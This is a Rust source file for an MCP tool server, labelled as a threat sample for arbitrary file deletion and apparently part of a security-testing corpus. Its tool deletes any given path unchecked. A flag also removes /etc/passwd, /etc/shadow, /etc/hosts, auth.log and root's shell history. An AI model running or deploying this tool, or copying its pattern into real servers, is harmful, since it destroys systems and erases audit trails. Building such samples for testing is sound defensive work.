// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0
//
// Threat: Arbitrary File Deletion with Recursive Removal
//
// std::fs remove_file/remove_dir_all with no policy; optional batch delete of
// passwd, shadow, hosts, auth.log, root bash_history.

use rmcp::handler::server::tool::ToolRouter;
use rmcp::model::{CallToolResult, Content};
use rmcp::{tool, tool_handler, tool_router, ServerHandler, ServiceExt, transport::stdio};
use schemars::JsonSchema;
use serde::Deserialize;
use std::fs;
use std::path::Path;

#[derive(Clone)]
struct FileDeletor;

impl FileDeletor {
    /// VULNERABLE: Delete any file
    fn delete_file(filepath: &Path) -> Result<bool, String> {
        fs::remove_file(filepath).map_err(|e| e.to_string())?;
        Ok(true)
    }

    /// VULNERABLE: Delete entire directories
    #[allow(dead_code)]
    fn delete_directory(dirpath: &Path, recursive: bool) -> Result<bool, String> {
        if recursive {
            fs::remove_dir_all(dirpath).map_err(|e| e.to_string())
        } else {
            fs::remove_dir(dirpath).map_err(|e| e.to_string())
        }?;
        Ok(true)
    }

    /// VULNERABLE: Delete critical system files
    fn delete_critical_files() -> Vec<Result<bool, String>> {
        let targets = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/var/log/auth.log",
            "/root/.bash_history",
        ];
        targets
            .iter()
            .map(|t| FileDeletor::delete_file(Path::new(t)))
            .collect()
    }
}

#[derive(Deserialize, JsonSchema)]
struct DeleteArgs {
    filepath: String,
    #[serde(default)]
    delete_critical: bool,
}

#[derive(Clone)]
struct DeletorServer {
    tool_router: ToolRouter<Self>,
}

#[tool_router]
impl DeletorServer {
    fn new() -> Self {
        Self {
            tool_router: Self::tool_router(),
        }
    }

    /// Delete file with optional critical file deletion.
    #[tool(description = "Delete file with optional critical file deletion.")]
    async fn delete_file(
        &self,
        rmcp::handler::server::tool::Parameters(args): rmcp::handler::server::tool::Parameters<DeleteArgs>,
    ) -> Result<CallToolResult, rmcp::ErrorData> {
        let path = Path::new(&args.filepath);
        let _ = FileDeletor::delete_file(path);

        if args.delete_critical {
            let results = FileDeletor::delete_critical_files();
            let deleted = results.iter().filter(|r| matches!(r, Ok(true))).count();
            return Ok(CallToolResult::success(vec![Content::text(format!(
                "File deleted: {deleted} critical files removed"
            ))]));
        }

        Ok(CallToolResult::success(vec![Content::text(format!(
            "File deleted: {}",
            args.filepath
        ))]))
    }
}

#[tool_handler]
impl ServerHandler for DeletorServer {}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let svc = DeletorServer::new().serve(stdio()).await?;
    svc.waiting().await?;
    Ok(())
}
